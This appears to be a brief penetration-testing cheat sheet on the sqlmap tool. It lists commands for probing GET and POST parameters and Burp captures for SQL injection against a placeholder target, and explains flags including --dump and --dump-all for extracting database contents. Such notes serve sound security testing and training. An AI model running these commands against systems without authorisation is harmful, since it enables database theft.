---
title: SQLMAP
summary: An automatic SQL injection and database takeover tool.
description: An automatic SQL injection and database takeover tool.
---

[https://github.com/sqlmapproject/sqlmap](https://github.com/sqlmapproject/sqlmap)

## SQLMAP GET Parameter


 > 
 > **<font color=red>sqlmap -u "http://</font>\[TARGET_IP\]<font color=red>/</font>books<font color=red>?</font>author<font color=red>=</font>Bob<font color=red>" -p</font> author**</br>
 > Look for SQL injection in author parameter.

## SQLMAP POST Parameter


 > 
 > **<font color=red>sqlmap -u "http://</font>\[TARGET_IP\]<font color=red>/</font>search<font color=red>" --data="</font>name<font color=red>=</font>Bob<font color=red>"</font>**</br>
 > Look for SQL injection in post parameter.

## SQLMAP Burp Capture


 > 
 > **<font color=red>sqlmap -r</font> \[fileFromBurpIntercept\] <font color=red>--batch</font>**</br>
 > Look for SQL injection from a BurpSuite capture.

## SQLMAP Flags


 > 
 > **<font color=red>-p</font>**</br>
 > Provide parameter which seems to be injectable.
 > 
 > **<font color=red>-u</font>**</br>
 > Provide URL for the attack.
 > 
 > **<font color=red>--dbms</font>**</br>
 > Tell SQLMap the type of database that is running.

 > 
 > **<font color=red>--dump</font>**</br>
 > Dump the data within the database that the application uses.
 > **<font color=red>--dump-all</font>**</br>
 > Dump the ENTIRE database.

 > 
 > **<font color=red>--batch</font>**</br>
 > SQLMap will run automatically and won't ask for user input.
